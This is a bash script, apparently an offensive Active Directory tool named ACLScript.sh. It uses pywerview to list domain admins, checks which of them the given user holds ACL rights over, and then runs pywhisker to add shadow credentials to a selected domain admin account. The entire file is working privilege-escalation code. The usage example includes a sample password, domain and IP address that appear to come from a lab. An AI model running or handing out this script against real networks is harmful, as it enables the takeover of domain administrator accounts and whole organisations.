#!/bin/bash

# Tool: ACLScript.sh
# Description: A tool to manage and execute pywhisker operations on domain admins based on ACLs.

# Function to display help message
show_help() {
    echo "Usage: $0 -u USERNAME -p PASSWORD -d DOMAIN -t TARGET -f FILENAME"
    echo ""
    echo "Required arguments:"
    echo "  -u USERNAME      Specify the username"
    echo "  -p PASSWORD      Specify the password"
    echo "  -d DOMAIN        Specify the domain name"
    echo "  -t TARGET        Specify the target IP address or hostname"
    echo "  -f FILENAME      Specify the filename for pywhisker"
    echo ""
    echo "Optional arguments:"
    echo "  -h               Show this help message and exit"
    echo ""
    echo "Example:"
    echo "  $0 -u dwitteveen -p 'Welcome02!' -d 'amsterdam.bank.local' -t '172.25.9.2' -f 'test1'"
}

# Function to handle missing arguments
check_required_arguments() {
    if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ] || [ -z "$DOMAIN" ] || [ -z "$TARGET" ] || [ -z "$FILENAME" ]; then
        echo "Error: Missing required arguments."
        show_help
        exit 1
    fi
}

# Parse command-line arguments
while getopts "u:p:d:t:f:h" opt; do
    case "$opt" in
        u) USERNAME=$OPTARG ;;
        p) PASSWORD=$OPTARG ;;
        d) DOMAIN=$OPTARG ;;
        t) TARGET=$OPTARG ;;
        f) FILENAME=$OPTARG ;;
        h) show_help; exit 0 ;;
        *) show_help; exit 1 ;;
    esac
done

# Check for required arguments
check_required_arguments

# Step 1: Get the SID of the authenticated user
echo "Retrieving SID of the authenticated user..."
USER_SID=$(pywerview get-objectacl -u "$USERNAME" -p "$PASSWORD" -t "$TARGET" --sam-account-name "$USERNAME" 2>/dev/null | grep "objectsid:" | awk '{print $2}')
echo "Authenticated user's SID: $USER_SID"

# Step 2: Get the SIDs of all domain admins
echo "Retrieving SIDs of all domain admins..."
DOMAIN_ADMIN_SIDS=$(pywerview get-netgroupmember -u "$USERNAME" -p "$PASSWORD" -t "$TARGET" 2>/dev/null | grep "objectsid:" | awk '{print $2}')
echo "Domain Admin SIDs:"
echo "$DOMAIN_ADMIN_SIDS"

# Step 3: Check if the authenticated user has any rights over the domain admins
declare -A USER_RIGHTS
echo "Checking if the authenticated user has rights over any domain admins..."
for admin_sid in $DOMAIN_ADMIN_SIDS; do
    if pywerview get-objectacl -u "$USERNAME" -p "$PASSWORD" -t "$TARGET" --sid $admin_sid 2>/dev/null | grep -q "$USER_SID"; then
        # Resolve the username, display name, and user principal name for the SID
        samaccountname=$(pywerview get-netuser -u "$USERNAME" -p "$PASSWORD" -t "$TARGET" --custom-filter "(objectsid=$admin_sid)" --attributes samaccountname 2>/dev/null | grep -oP '(?<=samaccountname:).*' | xargs)
        displayname=$(pywerview get-netuser -u "$USERNAME" -p "$PASSWORD" -t "$TARGET" --custom-filter "(objectsid=$admin_sid)" --attributes displayname 2>/dev/null | grep -oP '(?<=displayname:).*' | xargs)
        userprincipalname=$(pywerview get-netuser -u "$USERNAME" -p "$PASSWORD" -t "$TARGET" --custom-filter "(objectsid=$admin_sid)" --attributes userprincipalname 2>/dev/null | grep -oP '(?<=userprincipalname:).*' | xargs)
        
        echo "User $USERNAME has rights over Domain Admin SID: $admin_sid"
        echo "Resolved user details: SAMAccountName: $samaccountname, DisplayName: $displayname, UserPrincipalName: $userprincipalname"

        # Store the resolved username and SID in an associative array
        USER_RIGHTS["$samaccountname"]="$admin_sid"
    else
        echo "User $USERNAME does NOT have rights over Domain Admin SID: $admin_sid"
    fi
done

# Step 4: Allow the user to select which Domain Admin to target with pywhisker by username
echo "Please select a Domain Admin to target with pywhisker (by username):"
select TARGET_USERNAME in "${!USER_RIGHTS[@]}"; do
    if [ -n "$TARGET_USERNAME" ]; then
        TARGET_SID="${USER_RIGHTS[$TARGET_USERNAME]}"
        echo "You selected: $TARGET_USERNAME with SID: $TARGET_SID"
        break
    else
        echo "Invalid selection, please try again."
    fi
done

# Step 5: Run pywhisker.py against the selected Domain Admin
echo "Running pywhisker.py against the selected Domain Admin..."
python3 pywhisker.py -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" --target "$TARGET_USERNAME" --action "add" --filename "$FILENAME" --use-ldaps

echo "All tasks completed."
